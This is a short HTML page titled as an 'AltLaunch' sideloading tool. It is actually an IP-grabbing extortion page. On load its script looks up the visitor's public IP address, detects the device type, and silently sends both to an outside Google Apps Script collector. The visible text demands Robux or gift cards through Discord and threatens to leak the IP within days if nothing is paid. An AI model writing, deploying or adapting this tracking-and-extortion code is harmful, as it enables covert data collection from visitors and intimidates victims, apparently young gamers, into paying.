<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>AltLaunch Sideloading</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      background: #f0f4f8;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      box-sizing: border-box;
      text-align: center;
    }
    .container {
      max-width: 400px;
      color: #333;
    }
    .message {
      margin: 10px 0;
      font-weight: 600;
      font-size: 1.1rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="message">Oops! We got your IP</div>
    <div class="message">How can you not leak it?</div>
    <div class="message">DM me on Discord &lt;@altlaunch.&gt; and send any amount of Robux or Gift Card!</div>
    <div class="message">If I don't receive it in 3-5 days your IP will be publicly leaked</div>
  </div>

  <script>
    // Detect device type roughly
    function getDeviceType() {
      const ua = navigator.userAgent.toLowerCase();
      if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile";
      return "Desktop";
    }

    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const device = getDeviceType();
        // Send both IP and device type as query params
        new Image().src = "https://script.google.com/macros/s/AKfycbwWxM20EhE6W2iVRV7vAYjIqZI4e0Y-MnGUP-hiV_5eeSow-jDEw9D--rRX7tB6aLUMGQ/exec?ip=" + encodeURIComponent(ip) + "&device=" + encodeURIComponent(device);
      })
      .catch(err => {
        console.error("Failed to get IP:", err);
      });
  </script>
</body>
</html>
